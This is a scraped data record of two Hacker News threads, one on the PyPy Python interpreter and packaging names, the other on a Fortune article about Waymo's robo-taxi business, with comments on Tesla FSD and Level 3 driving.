Dustin Ingram: https://dustingram.com/talks/2018/10/23/inside-the-cheesesho... (halfway through) PyPI is sometimes called the Cheeseshop. This is a reference to this Monty Python skit, where a man goes into a cheeseshop which has no cheese for sale. The joke is that when PyPI was first created, there was nothing in it. Hence, \"The Cheeseshop\". But it does have stuff in it now, so it's not really even appropriate to call it that anymore. reply bxparks 4 hours agorootparentprevGood lord, I have never heard of the term \"wheel of cheese\", thanks! Probably because I rarely eat cheese. 20+ years of using Python on and off, and I finally understand what a \"wheel\" is. Addendum: Every time I tried to understand Python packaging, I would come across the term \"wheel\" and my eyes would glaze over because I couldn't figure out what it was from context (\"what the heck is a wheel?\"). Maybe now I'll go back and finally understand Python packaging. reply JKolios 4 hours agorootparentprevCheese was, and to a degree still is, stored and distributed in wheels. As a retail buyer you rarely encounter an entire wheel, but it's definitely a common sight in wholesale. reply barkingcat 1 hour agorootparentprevcheese are made in wheels. that's 1 unit of a production of cheese is called a wheel. reply cqqxo4zV46cp 4 hours agorootparentprevItâ€™s not that you havenâ€™t seen enough Monty Python, itâ€™s that you seemingly havenâ€™t been to a supermarket before. reply bxparks 3 hours agorootparentHa, no, it's because I don't (or rarely) eat cheese. reply geertj 4 hours agorootparentprevBecause of a \"wheel of cheese,\" usually referring to Parmezan cheese. reply AnimalMuppet 4 hours agorootparentNo, not just Parmezan. Gouda and similar cheeses often come in wheels. reply jiayo 5 hours agorootparentprevThen where did eggs come from? reply johndough 5 hours agorootparentPythons lay eggs. reply progval 4 hours agorootparentprevfrom https://en.wikipedia.org/wiki/Spam_(Monty_Python_sketch)#Men... / https://www.youtube.com/watch?v=anwy2MPT5RE reply sanderjd 4 hours agorootparentprevChickens. Or maybe the other way around... reply 7bit 4 hours agorootparentChickens come from eggs. That's scientifically proven. reply bee_rider 6 hours agorootparentprevI wish I was good at coming up with Python toolsâ€¦ we need to complete the set, PiPy and PiPi. reply smcl 5 hours agorootparentSomeone has beaten you to both: - https://pypi.org/search/?q=PiPy - https://pypi.org/project/pipi/ reply bee_rider 4 hours agorootparentMaybe Iâ€™ve been beaten, or maybe weâ€™re all on the same sideâ€¦ reply asddubs 6 hours agoparentprevYeah, I had to reread the opening paragraph before I got it reply olliemath 7 hours agoprevI've used pypy on large codebases for years. Generally it's fine so long as you don't need any of the packages that are thin wrappers around C/fortran. It seems a lot of maintainers these days are pretty good about considering it as a target On the other hand the memory footprint can be painful - not just the deferred garbage collection of things like weakrefs and closed files, but even regular objects. A while back I had hope that the faster cpython project would somewhat remove our need to use it, just so we could have a lower memory footprint, but that seems to have stalled reply graemep 5 hours agoparent> Generally it's fine so long as you don't need any of the packages that are thin wrappers around C/fortran This is precisely where my attempt to use Pypy failed. reply spiderxxxx 2 hours agorootparentWhy? What specifically caused you not to seek out alternatives? PyPy and libraries with CFFI seem to work okay together, but it can run python native code nearly as fast as C, so I always look for a pure python solution rather than depend on a C library. reply acheong08 5 hours agoparentprevFortran! Would be interested in your story on how youâ€™re integrating Python and Fortran. That sounds very interesting reply 7thaccount 5 hours agorootparentThey likely mean some of the numerical packages that call out to BLAS/LAPACK or whatever as all that was originally written in Fortran. I think a lot has been converted to C now. reply reubenmorais 5 hours agorootparentprevSciPy is a popular Python package which exposes functionality written in Fortran to Python, for example. reply actinium226 4 hours agorootparentprevI just recently made some Python wrappers for a Modern Fortran optimization library for derivative free optimization. https://github.com/libprima/prima It basically had to go through Fortran -> C -> C++ (with pybind11) -> Python. At one point we had a slightly simpler setup with Fortran -> C -> Python (with ctypes), but ended up going with pybind11 after some discussion with the SciPy folks who steered us away from ctypes. reply barkingcat 1 hour agorootparentprevnumpy / scipy both use fortran. Scipy has fortran as a build dependency (ie a large portion of it depends on fortran), and numpy can be built without fortran, but has large portions of optimizations in fortran. anyone who's ever used numpy/scipy has been using python integrated with fortran. reply dagw 4 hours agorootparentprevNot the OP, but I have written a fair few python wrappers around old Fortran code. There is a pretty great tool called f2py which automates almost all of the hard work. If the Fortran code isn't to weird it can completely autogenerate all the code you need to call your fortran function from python. reply StableAlkyne 4 hours agorootparentprevFortran is actually pretty okay if you're doing matrix or vector operations! Builtin cross products, you choose how the array is indexed when you create it, can enforce functional purity to help you parallelize, etc It is hot garbage for almost anything that isn't math though - which is okay, because it's been focused math from the start - strings and parsing an unstructured input is an exercise in pain for example. And the ecosystem is heavily geared toward math and scientific computing, so you will find yourself rolling your own stuff quite often if you deviate from that niche reply pklausler 3 hours agorootparent> you choose how the array is indexed when you create it, How? reply barkingcat 1 hour agorootparenthttps://fortran-lang.org/learn/quickstart/arrays_strings/ during array creation you can specify custom lower bound. reply pjmlp 7 hours agoprevIt is a bit sad that PyPy great achievements are mostly ignored, and it took Microsoft and Facebook stepping in, Julia and Mojo arriving into the scene, AI GPU frameworks JITs, for finally CPython to take having a JIT seriously. reply wyldfire 5 hours agoparentI never understood why it didn't completely take over. It worked flawlessly for every use case I tried. It always seemed to me like it a \"free\" way to make it faster. Why would it matter whether it was endorsed by the BDFL or PSF? reply jsmeaton 5 hours agorootparentIt doesnâ€™t work with psycopg or many other libraries that use c extensions. Thatâ€™s the main reason. reply lucb1e 4 hours agorootparentOnly because they were compiled against cpython and not pypy right? If pypy had taken off/over, wouldn't it have been the other way around, where you need to do a special compile any time you want to use a C project with cpython rather than using the prebuilt pypy-compatible version? Edit: things seem to have changed since I last looked into compiling a dependency for pypy. https://doc.pypy.org/en/latest/faq.html#do-c-extension-modul... now says they support c-extension modules without modifications The package you mentioned, some postgres thing apparently, mentions they support pypy 3.9 and 3.10: https://www.psycopg.org/psycopg3/docs/basic/install.html reply vasco 4 hours agorootparent\"Only\": https://github.com/psycopg/psycopg/issues/154 reply cqqxo4zV46cp 4 hours agorootparentprevBy â€œsome postgres thingâ€, you meanâ€¦pretty much the only way that one would connect to Postgres in Python! reply leadingthenet 11 minutes agorootparentThere's also https://github.com/MagicStack/asyncpg reply lucb1e 4 hours agorootparentprevRight, I just wasn't familiar with it (never heard this name before) and the only association I could think of for this abbreviated name was psyops and cops. Turns out it's actually for postgres which, of course, is a name I very well know. Didn't realize it was a well-known library! reply wyldfire 4 hours agorootparentprevOh, I'd thought some significant effort had gone into emulating the CPython C extension interface. But maybe even with that, it's unable to support some extensions? reply QuadmasterXLII 3 hours agorootparentprevIf someone suggested switching to a new C++ compiler with 99% of the features of the C++ standard with the selling point that it ran template metaprograms 100x faster, could you convince your company to switch? In the setting where python shines and performance matters, python is serving as the metalanguage executed at compile time for a strictly typed compiled language such as SQL, torch graph traces, jax, or z3 reply PartiallyTyped 5 hours agorootparentprevIf you want your code to run faster, you should probably just use PyPy. Guido Van Rossum (once CPython's BDFL) said that. reply throw0101d 4 hours agorootparentAt PyCon 2015: * https://www.youtube.com/watch?v=2wDvzy6Hgxg&t=16m52s reply zzzeek 5 hours agorootparentprevpypy has never kept up with cPython features and releases. it was always well behind the curve and did not provide essential behaviors in a timely fashion. plus it can't run any C extensions or cython code (or has to run them with emulations that erase the speed benefits), which takes a big chunk out of the available ecosystem. Example: the situation with numpy: https://doc.pypy.org/en/latest/faq.html#what-about-numpy-num... reply robertlagrant 4 hours agorootparentIt keeps up pretty well, I think. But given what's in a version of Python is \"what's implemented in CPython at that version\", I don't see how it's possible to keep up very easily at all. reply zzzeek 1 hour agorootparentthis is nonsense, cPython's development is very public and works on a multi-year schedule. It's not like Python 3.5.0 is released and that's when everyone knows what features it will have, each major version goes through at least a year of alphas and betas. Pypy spends a few years behind that and on top of it sometimes introduces new bugs that have to be reported and fixed. this is not anyone's fault, it's just for what pypy is doing to be successful, they would need a much larger maintenance ecosystem which they just dont have. The contributor ecosystem for cpython is literally ten times larger than that of pypy. reply grumpyprole 7 hours agoparentprevI had always assumed it was because they had exposed far too many internals over the years, making a JIT that was backwards compatible with the majority of existing code, an extremely difficult undertaking. reply IshKebab 6 hours agorootparentI assumed it was because they explicitly did not have performance as a goal, probably because performance is so bad they wanted to have a good answer and \"performance is a non-goal\" is the best they could do. Psychologically that is much easier to digest than \"yes it's awful, sorry\". I don't think backwards compatibility can really be the reason. Python does not care that much about backwards compatibility, as seen from the extensive list of features they remove in every release: https://docs.python.org/3/whatsnew/3.12.html#removed reply Waterluvian 6 hours agorootparentIâ€™m confused now. Whatâ€™s the point of PyPy if performance isnâ€™t a goal? reply orf 6 hours agorootparentItâ€™s a completely unrelated project reply Waterluvian 6 hours agorootparentOh theyâ€™re referencing the fork and not base PyPy, which is still about performance? reply orf 6 hours agorootparentThe CPython project didnâ€™t have performance as a goal. PyPy is a different, non-PSF implementation of Python reply Waterluvian 4 hours agorootparentOh okay. I completely misunderstood the comment. Yes, CPython isnâ€™t designed specifically for performance. I love how legible the code is. reply crabbone 6 hours agorootparentprevThe fact that PyPy has a JIT is kind of a side-effect. PyPy's goal is not to make a JIT compiler for Python. To be honest, the goals are broad and ambiguous, but it's something along the lines of \"refining the core Python language, a subset of Python, and then see if it can be made to run Python in various other ways\". I think, that the first goal of PyPy was to compile Python to C or something like that. JIT came later. reply cwillu 5 hours agorootparentPyPy was a successor to Psyco, by the same author. JIT was always a core part of the project. reply crabbone 4 hours agorootparentYou may want to read this: https://www.pypy.org/posts/2018/09/the-first-15-years-of-pyp... and further down. You'll see that JIT wasn't always a core part of the project. You just for some reason decided to use the fact that the project was renamed at some point to fight a stupid battle on the Internetes. reply cwillu 4 hours agorootparentâ€œOne of the not so secret goals of Armin Rigo, one of the PyPy founders, was to use PyPy together with some advanced partial evaluation magic sauce to somehow automatically generate a JIT compiler from the interpreter. The goal was something like, \"you write your interpreter in RPython, add a few annotations and then we give you a JIT for free for the language that that interpreter implements.\"â€ reply __alexs 6 hours agoparentprevIt always seemed to me like they didn't have a very good relationship personal with Guido for some reason. reply PartiallyTyped 5 hours agorootparentGuido actually said If you want your code to run faster, you should probably just use PyPy. reply __alexs 3 hours agorootparentI don't think these statements are in conflict. reply crabbone 6 hours agoparentprevI don't see any reason for Python to want to have JIT. There are already languages that are more suited for that kind of model, that have a long history of incremental improvement of JIT compiler design and implementation. Why is Python trying to compete in the field where it's almost certainly guaranteed to lose, and is almost certainly guaranteed to win nothing? Having an interpreter is great for some things. Especially, if you want to have bindings to third-party libraries, which is something Python does a lot. ---- My interpretation of the events is very different from yours. I believe that Python became swarmed by people who really, really want Java, but they feel that Java isn't cool for some superficial reason. And guided by the fear of crowd opinion, they won't just use Java and be content with it. Instead, they slowly make what used to be cool into a very bad clone of Java. And the reason why the big names you mentioned have anything to do with JIT development is because they want to ride this wave of insecure and self-doubting developers to score popularity points, and, eventually, to control the popular technology. Esp. in the case of Microsoft, it's a multi-prong offensive. They've installed their people in Python Foundation, various SIGs related to Python. They've made CPython builds and CI run on their infrastructure, preventing it from choosing free tools for their development process... Microsoft has a bad rep with people who used to like Python, and that's why they don't rebrand it into MS-Python, but really, if they wanted to, they could certainly do it. reply pjmlp 6 hours agorootparentBecause that is how we end up with AI tooling, and Web sites written in Python, or desktop applications in Electron. No matter how things are supposed to be, that is not how bootcamp, self called \"engineers\", do their programming. Also as proven by other ecosystems, with JIT, AOT, REPLs, in the box, having an interpreter like CPython isn't a requirement for anything. As for your MS jab, it was called IronPython. reply bratao 7 hours agoprevThe next versions of CPython are expanding in two very important areas for speed. The free-threading (NoGIL) project will allow true multithreading support and the Faster CPython is trying to speedup Python and are developing a JIT. Exciting times! reply willvarfar 7 hours agoprevfor several years I used to use pypy to get the dev speed of python on the kinda crunchy problems that you'd normally need to work in a classic compiled language for. I remember it fondly. At the time, you could find the devs on freenode and the few times I bumped into something being slower than expected they jumped on my informal bug reports and quickly recreated it and fixed it etc. Awesome! :) reply notresidenter 6 hours agoprevIt took me 5 minutes to realize that this isn't PyPi the package manager but PyPy, an interpreter for python. This was very confusing, especially because they mentionned pipx, which seems related to PyPi, so it was plausible this was about PyPi. reply ziml77 5 hours agoparentPyPI is not a package manager. It's the Python Package Index (hence the capital \"I\"). It hosts the packages but the standard manager is pip. reply crispyambulance 6 hours agoparentprevYeah, it's like they're shooting themselves in both feet by just naming their project badly. What a pity. It could have been worse. Years ago a promising audio format was competing with mp3. It was better quality at any given compression and open source. The creators named it \"Ogg Vorbis\". Like some kind of dungeons and dragons character or something. I haven't seen it around for a long time, I think that's because the name was so stupid. reply pavel_lishin 5 hours agorootparentEveryone laughs at Ogg Vorbis until the +3 great-axe starts swinging and you're taking an average of 2d12+16 damage per round. reply danadam 5 hours agorootparentprev> I haven't seen it around for a long time, Spotify is using it in their standalone clients. reply mrtesthah 5 hours agorootparentprevThe Vorbis codec was simply not as good[1] as AAC or Opus which have since superseded it. 1. http://opus-codec.org/comparison/ reply nick238 5 hours agorootparentAAC is proprietary and Opus didn't exist before 2012. Vorbis came out in 2000. The format for audio files doesn't matter much nowadays, especially with sufficient bandwidth and most people streaming them from whatever service that uses whatever it will. In the era of Napster, those early 2000s, the formats were very front-of-mind. reply bb611 5 hours agorootparentprevPeople would just have called it \"ov\" and moved on. Look around the tech ecosystem, lots of thriving projects with stupid names. reply bootsmann 6 hours agoprevTangentially related but pipx is a silent hero in the quest for better python environment management. Takes care of the problems with bootstrapping your environment manager of choice without installing it in the python root. reply nick238 5 hours agoparentConveniently slots into the occasionally confusing P-dominated mess of pip, PyPI, pipx, pipenv, pyenv, PyPy... reply bityard 6 hours agoprevPyPy is also (as far as I know) the only Python 2 implementation still actively supported, not including OS-specific packages. reply tasty_freeze 5 hours agoparentNuitka is actively maintained and support for 2.6 and 2.7. It is the work of a single guy, and I have never used it, so I don't know much about it. https://nuitka.net/ reply robertlagrant 7 hours agoprevI do think that PyPy is a strangely undercelebrated heroic Python effort. reply actionfromafar 4 hours agoparentShedskin is the completely un-celebrated heroic Python effort. reply lucb1e 4 hours agorootparentWell now don't leave us hanging... > an experimental restricted-Python to C++ programming language compiler reply tiagod 5 hours agoprev>403: Request Unsuccessful >Your request cannot be satisfied. >You appear to be trying to break this web server. Goodbye. Sorry, I guess... reply cl3misch 4 hours agoprevOk, but what CLI tools are you using where you would care about performance between CPython and PyPy? reply KptMarchewa 1 hour agoparentYear or two ago, literally any. Now with ruff and uv, much less. reply lyu07282 6 hours agoprev [â€“] that is awesome! When it began development I never really thought PyPy would work this well, it reminds me a bit of GraalVM in that \"high-arcane\" magic voodoo sense of compiler/runtime development. It took 17 years of dedicated effort to get here, but the result is really impressive. reply pjmlp 4 hours agoparent [â€“] This is why many technology improvements are only possible by visionaries that are able to dream what things should look like, Alan Kay and Jobs style. Not by those that cannot phantom anything besides what is available today running in front of them. Android versus Longhorn, as another example. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Chris Siebenmann reports a positive experience using PyPy as a drop-in replacement for CPython on Ubuntu servers, installed via pipx.",
      "PyPy has been functioning seamlessly for years, even with complex packages, including a recent cloud provider's CLI tool.",
      "Siebenmann's experience underscores PyPy's effectiveness and reliability as a faster alternative to CPython."
    ],
    "commentSummary": [
      "The discussion clarifies the confusion between PyPy (a Python interpreter) and PyPI (Python Package Index), and humorously explains the term \"wheel\" in Python packaging.",
      "Users share experiences with PyPy, highlighting its benefits and limitations, especially with C/Fortran packages and memory usage, and compare it with CPython.",
      "The conversation also covers Python's integration with other languages for scientific computing, challenges of Just-In-Time (JIT) compilation, and the influence of major tech companies on Python's development, including projects like NoGIL and Faster CPython."
    ],
    "points": 180,
    "commentCount": 89,
    "retryCount": 0,
    "time": 1717066360
  },
  {
    "id": 40516532,
    "title": "Waymo's Strategic Patience and Engineering Propel It to Robo-Taxi Leadership",
    "originLink": "https://fortune.com/2024/05/29/waymo-self-driving-robo-taxi-uber-tesla-alphabet/",
    "originBody": "MAGAZINEÂ·ALPHABET How Waymo outlasted the competition and made robo-taxis a real business BYDAVID MEYER ENDURANCE RACE: A wide range of companies have entered, and quit, the self-driving car contest over the years. FROM TOP: COURTESY OF WAYMO; COURTESY OF CRUISE; COURTESY OF ZOOZ; ANDRE J. SOKOLOWâ€”PICTURE ALLIANCE/GETTY IMAGES; GENE J. PUSKARâ€”AP PHOTO The road to autonomous driving is not for the faint of heart. Look behind to view the wreck of Uberâ€™s self-driving car. In the ditch to the left is General Motorsâ€™ Cruise robo-taxi. And that scent of burning rubber? Thatâ€™s from the skid marks Apple made as it careened toward the exit ramp. But one funny-looking vehicle appears to be gaining momentum. Waymo, born 15 years ago as the â€œGoogle Self-Driving Car Project,â€ now offers fully autonomous rideshare services in Phoenixâ€”where its driverless vehicles also make Uber Eats deliveriesâ€”as well as in San Francisco and part of Los Angeles; 50,000 paid Waymo rides take place across the three cities each week, the company recently announced. That paying passengers now routinely hop into empty Waymo vehicles, which gracefully move among the surrounding jumble of human-piloted cars, is a remarkable feat of engineering and a genuine pinch-me moment for anyone who has experienced it. And while Waymo has been at it longer than most, the fact that it has become the leader in the crowded race to commercialize self-driving cars was not a given. Frederic Bruneteau, the founder of Ptolemus, a Brussels-based automation consultancy and market research firm, likens the competition in the self-driving car industry to the grueling Tour de France bicycle race: â€œSometimes you see people catching up with you, and sometimes youâ€™re getting ahead and the number of people behind you are pretty scarce. Thatâ€™s whatâ€™s happened with Waymo.â€ 50,000 TOTAL WEEKLY WAYMO RIDES IN L.A., PHOENIX, AND SAN FRANCISCO. SOURCE: WAYMO Aman Nalavade, Waymoâ€™s group product manager for growth and expansion, says a go-slow approach has proved to be the right strategy for this race. â€œWe scale responsibly, as itâ€™s bad business to overrun supply,â€ Nalavade says. For technology as novel as fully autonomous vehicles, â€œit takes time to build up a meaningful service and gain a communityâ€™s trust.â€ But even the most bullish believers in autonomous transportation acknowledge the tech still has a ways to go before itâ€™s reliable enough for widespread deployment on U.S. roads. And while Waymo has outlasted its rivals so far, new challenges on the regulatory and competitive front mean that itâ€™s closer to the next phase of the race than it is to the finish line. From moonshot to reality Google launched its self-driving car program in 2009, incubating it within the X â€œmoonshotâ€ lab before spinning it out as a stand-alone business called Waymo (â€œa new way forward in mobilityâ€) within the Alphabet parent company. The carâ€™s physical design and functionality, as well as the teamâ€™s leadership, have gone through multiple transformations since then. Google initially designed the technology as a copilot system that allowed human drivers to let go of the controls, retaking the wheel only when necessary, but concluded the approach was unsafe. In 2015, the company began building its own pod-shaped â€œkoalaâ€ carâ€”a two-seater with no pedals or steering wheelâ€”only to revert in 2017 to using modified versions of commercially available cars. Today Waymoâ€™s fleet consists of Jaguar I-Pace electric SUVs equipped with an array of sensors. Thereâ€™s been no shortage of problems and setbacks. In December, Waymo recalled its vehicle software after two of the cars crashed into a pickup that was being towed in Phoenix. And U.S. regulators recently opened an investigation into 22 reported incidents involving Waymo cars, including 17 collisions with stationary objects such as gates and parked cars, and multiple occasions where the vehicles appeared to disobey street signs and road markings. But whether the result of superior safeguards or mere luck, Waymo has managed to avoid the more serious road accidents that have derailed its rivals. Uber abandoned its self-driving car efforts in 2020, two years after one of its cars fatally struck a pedestrian in Arizona. A Cruise vehicle in October hit and dragged a pedestrian who had been thrown into its path after being struck by another car. Regulators made Cruise suspend its driverless operations in San Francisco, and Cruise soon halted operations nationwide. 250 WAYMO VEHICLES OPERATING IN SAN FRANCISCO. SOURCE: WAYMO It was a major setback for Cruise, which, just months earlier, had gotten California regulatorsâ€™ green light to offer driver-free robo-taxi services to paying customers any time of day in San Francisco. Cruise has not provided a date for when it plans to resume its robo-taxi passenger service, but recently began testing cars with human safety drivers in Arizona again. Apple, meanwhile, called it quits in February, shutting down an expensive yearslong project that never reached the point of testing without human safety drivers on public roads. Waymoâ€™s ability to â€œmostly stay clear of trouble,â€ along with its steady geographical expansion and its investorsâ€™ deep pockets, has put the robo-taxi operation â€œinto a very good position,â€ says Pedro Pacheco, a vice president of research at Gartner. While other autonomous driving companies might be tempted to move too fast in order to justify themselves to their investors, he adds, Waymoâ€™s situation as a mostly autonomous sister company to the cash-generating Google gives it â€œthe comfort to take a somewhat cautious pace of growth.â€ What comes next The heat may soon be on again, as Tesla CEO Elon Musk has promised that his company will reveal its own robo-taxi in early August. Tesla has so far not been a direct competitor to Waymoâ€”its fallaciously named â€œfull self-drivingâ€ (FSD) technology is more akin to an advanced driver-assist system, requiring a human driver to be attentive at all times (known as Level 2 autonomy in industry jargon, versus Waymoâ€™s Level 4 vehicles, and Level 5, the highest). While the two companiesâ€™ vehicles use different hardware to navigate the roadsâ€”Teslas rely solely on cameras; Waymo cars draw data from cameras plus radar and lidar laser sensorsâ€”AI will play an increasingly important role. Teslaâ€™s fleet of hundreds of thousands of vehicles constantly feed data to the companyâ€™s neural networks so that its FSD software can learn to drive more like humans do. This yearâ€™s version of the software, FSD 12, is the first to let the neural network make decisions about driving. According to Gartnerâ€™s Pacheco, Teslaâ€™s self-learning approach is a â€œhint of the direction in which this is heading, and now an AI breakthrough could unlock a lot of new possibilities for autonomous vehicles.â€ Waymoâ€™s Nalavade says AI â€œhas long been a part of our stack, but its role has grown massively in recent years.â€ The progress in AI, he notes, has made Waymoâ€™s recent expansion possible by allowing its systems to â€œgeneralizeâ€â€”to apply previously learned lessons to new environments, rather than having to start from scratch in each new place. â€œThe Waymo Driver [system] is capable of generalizing to dozens more cities tomorrow, but weâ€™re focused on building a valuable ride-hailing service that people want to use in the cities [in which] we operate,â€ he says. While an imminent Tesla robo-taxi has many doubters given Muskâ€™s history of overly optimistic timelines, there are plenty of other players with no intention of ceding the future of automobiles to Waymo. Amazon subsidiary Zoox has a robo-taxi currently shuttling employees to work in certain locations. Automakers like Ford, Volkswagen, and Mercedes-Benz are driving hard (often in partnership with startups) toward Level 3 systems, which still require occasional human intervention. And Chinaâ€™s rising band of automakers have various projects in the works. â€œWeâ€™re far from getting to the final chapter of robo-taxis,â€ says Pacheco. This article appears in the Jun/July 2024 issue of Fortune with the headline â€œHow Waymo steered to the front of the pack and made self-driving taxis a reality.â€ Join our Fortune Features list to receive breaking news alerts from our newsroom and our latest stories. Sign up for free. Latest from the Magazine 0 minutes ago MAGAZINE - LEADERSHIP CEOs can hurt their companies if they stay too long. Whenâ€™s the right time to say goodbye? BYGEOFF COLVIN 0 minutes ago MAGAZINE - DEFENSE Silicon Valley startups are invading the military market BYJESSICA MATHEWS 0 minutes ago MAGAZINE - ALPHABET How Waymo outlasted the competition and made robo-taxis a real business BYDAVID MEYER 0 minutes ago MAGAZINE - RETAIL The cult of Costco: How one of Americaâ€™s biggest retailers methodically turns casual shoppers into fanatics BYPHIL WAHBA 0 minutes ago MAGAZINE - MICROSOFT Satya Nadella has made Microsoft 10 times more valuable in his decade as CEO. Can he stay ahead in the AI age? BYJEREMY KAHN 0 minutes ago MAGAZINE - A.I. AI isnâ€™t coming for your jobâ€”at least not yet BYJEREMY KAHN Most Popular 0 minutes ago RETAIL Amazon, Walmart, and Target finally realize their colossal pricing mistakeâ€”now theyâ€™re slashing costs to win back customers BYSASHA ROGELBERG 0 minutes ago TECH A 35-year-old Chinese man has been tagged as the alleged mastermind behind a gargantuan botnet used to steal billions from zombie computers BYTHE ASSOCIATED PRESS 0 minutes ago SUCCESS Gen Z really are the hardest to work withâ€”even managers of their own generation say theyâ€™re difficult. Instead bosses plan to hire more of their millennial counterparts BYORIANNA ROSA ROYLE 0 minutes ago TECH Toyotaâ€™s bet on hybrids was mocked, then vindicated. Now itâ€™s trying to repeat the trick with an unlikely bet on the combustion engine BYMARCO QUIROZ-GUTIERREZ 0 minutes ago FINANCE American Airlines CEO fired top exec after controversial â€˜modern retailingâ€™ strategy infuriated corporate clients BYMARY SCHLANGENSTEIN AND BLOOMBERG 0 minutes ago FINANCE â€˜How can you tell me it wonâ€™t lead to stagflation?â€™ Jamie Dimon says â€˜extraordinaryâ€™ government spending has him bracing for high inflation and unemployment BYELEANOR PRINGLE",
    "commentLink": "https://news.ycombinator.com/item?id=40516532",
    "commentBody": "How Waymo outlasted the competition and made robo-taxis a real business (fortune.com)176 points by webel0 22 hours agohidepastfavorite326 comments notum 21 hours agoFull article: https://web.archive.org/web/20240529210213/https://fortune.c... zellyn 12 hours agoprevThis seems silly. Itâ€™s been obvious even to casual observers like myself for years that Waymo/Google was one of the only groups taking the problem seriously and trying to actually solve it, as opposed to pretending you could add self-driving with just cameras in an over-the-air update (Tesla), or trying to move fast and break things (Uber), or pretending you could gradually improve lane-keeping all the way into autonomous driving (car manufacturers). Thatâ€™s why itâ€™s working for them. (IIUC, Cruise has pretty much also always been legit?) Donâ€™t even get me started on the â€œdidnâ€™t take psych 102: Attention and Memoryâ€-level cluelessness required to believe a human can safely pay attention well enough in a vehicle that reliably tricks you into believing itâ€™s autonomous to take over in the split seconds before a disasterâ€¦ I find it hard to believe that the Tesla and Auto Manufacturer positions arenâ€™t knowingly deceptive. I mean, what are they going to say? â€œItâ€™s too hard so weâ€™re just waiting for Waymo or Cruise to license their tech once it worksâ€? Iâ€™m gonna stop here before I start mocking geohotâ€¦ I seriously canâ€™t believe the journalists who wrote those early stories were willing to risk their lives like thatâ€¦ reply jefftk 4 hours agoparent> I find it hard to believe that the Tesla and Auto Manufacturer positions arenâ€™t knowingly deceptive. The auto manufacturer approach is also showing progress. In CA and NV you can buy and operate a Mercedes with Drive Pilot, which is Level 3 certified. In the right (very restrictive conditions which essentially come down to \"sitting in highway traffic on your commute\") you legally do not have to pay attention to the road and can read/watch/work/etc. https://www.mbusa.com/en/owners/manuals/drive-pilot reply HarHarVeryFunny 2 hours agorootparentThere's still plenty that can go wrong in a hurry even if you are just streaming along in lane. All it takes is for something non-routine to happen such as a car ahead reacting to an animal, or swerving as the driver reaches for something or spills coffee on themself, or a wheel come off a car (I've seen it happen to a car in front of me), or a car crosses the center median in opposite direction (which left my ex-boss hospitalized for 6 months). I'd personally never trust an autopilot unless it's either backed by human-level AI which has also had years of driving experience, or it's in some very highly constrained environment (maybe airport bus going from gate to plane). Out on a highway or public road system is the most unpredictable environment possible. reply CharlieDigital 1 hour agorootparent> All it takes is for something non-routine to happen such as a car ahead reacting to an animal, or swerving as the driver reaches for something or spills coffee on themself, or a wheel come off a car (I've seen it happen to a car in front of me), or a car crosses the center median in opposite direction (which left my ex-boss hospitalized for 6 months) Inherent in this statement is the assumption that in such types of events, a human would necessarily do better than the machine. Each of these are extremes and I doubt that most human drivers would be able to react to avoid an accident or damage most of the time. reply HarHarVeryFunny 49 minutes agorootparentIt depends how quickly it happens, and how well they are paying attention. We all know those accident prone drivers who are never \"at-fault\" - just very bad at avoiding them! However, the human has the major advantage of having a brain and being able to understand the consequences and potential outcomes of something in real-time as it is unfolding. I doubt most autopilots would understand the situations I mentioned - certainly not unless they were specifically pre-programmed/trained into the system. Would an autopilot even see what is going on inside a car if a driver is bending down below dashboard, or fighting with passenger, for example? reply shkkmo 4 hours agorootparentprevThat 'level 3' is still basically lane keeping and auto cruise control, the driver still has to be ready to immediately takeover, if you don't the car will stop in it's current lane with it's blinkers on. This is about the peak of what you can get with automated lane keeping and braking. I don't see any route from this point to anything like level 4. reply jefftk 3 hours agorootparent\"Immediately\" can mean a bunch of different things in a driving context! Here it means \"within ten seconds\". Which is both short and long: it's long enough that many of the things you might want to do that take your attention are fine (reading, watching a movie, working) but not long enough that you can sleep. > This is about the peak of what you can get with automated lane keeping and braking. Are you saying that within 5y, say, we won't see a level three system that's able to handle full highway speeds? reply jvanderbot 3 hours agorootparentprev> level 3 is still basically ... well yeah, that is the definition of level 3. That's not going to change. They are limited by: > Our technology relies on a digital high-definition map that provides a 3D image of the road and the surroundings with information on road geometry, route characteristics, traffic signs and special traffic events IMHO Tesla's \"F--- it all just use NN\" approach does get around the pre-generated 3D map requirement. Even if it is not much more than Level 3.5 at the moment. Pretty funny to see it accelerate to 65mph in a parking lot b/c it thought it was on the nearby highway though. reply jefftk 1 hour agorootparent> it is not much more than Level 3.5 at the moment It's not even level 3, and couldn't be certified as such. It's not reliable enough for the person in the driver's seat to focus their full attention elsewhere. >> level 3 is still basically lane keeping and auto cruise control > well yeah, that is the definition of level 3 No, it's the definition of level 2: https://www.sae.org/blog/sae-j3016-update (\"example features: lane centering and adaptive cruise control at the same time\") reply jvanderbot 1 hour agorootparentI mean, that's very official looking. And the differentiating criteria for level 3 is \"You must take over when asked\" and everything 2 or below is \"You must brake, steer, or accelerate as needed to ensure safety\". Am I missing something? Lane keeping, cruise control and offset keeping is level 3. That's what this feature offers according to a few posts up. It makes no difference to the conversation. I'll stop poking the bear here. reply m348e912 1 hour agoparentprev>pretending you could add self-driving with just cameras in an over-the-air update (Tesla) I have watched enough recent Tesla self-driving ride along videos on YouTube to suspect you might be mistaken on this point. Tesla intends to launch a cybertaxi fleet and their software looks like it will be good enough to get them there without lidar or additional sensors. reply donut_rider 49 minutes agorootparentJust a timeline of how Musk predicts that FSD will be solved in the next year every year since 2015: https://motherfrunker.ca/fsd/. It is one thing to cherry-pick flawless drives on a sunny day and upload it to YouTube while having someone behind the wheel ready to take over the glorified driving assistant system. It is another to run a commercial driverless service open to the public 24/7 in one of the biggest urban areas, knowing that riders will record everything, assuming accident liability, and keeping a nice safety record without someone behind the wheel. reply jeffbee 1 hour agorootparentprevThere are no Teslas that have ever taken a trip without an operator behind the wheel. The idea that there will be a near-future discontinuity after which a Tesla will be able to serve as a robotaxi is pretty ridiculous. I just watched the latest video from AIDRIVR on YouTube. AIDRIVR is a TSLA pumper-and-dumper who has dedicated their channel to uncritical praise of FSD. In the first third of the video FSD v12 runs two stop signs, once directly into oncoming traffic in a 1-way traffic control and once at a stop where the cross traffic does not stop. This stuff is not even a little bit ready for fully supervised operation. https://youtu.be/fpoXr_z_6a4?t=565 reply E39M5S62 1 hour agorootparentprevTesla 'intends' to do a lot of things, but rarely seems to be able to actually DO them. reply fourseventy 1 hour agorootparentYa, other than becoming the best selling EV company and revolutionizing the entire EV industry... reply zellyn 11 hours agoparentprevWhat Iâ€™m really looking forward to is when autonomous taxis can run a net profit â€”- including 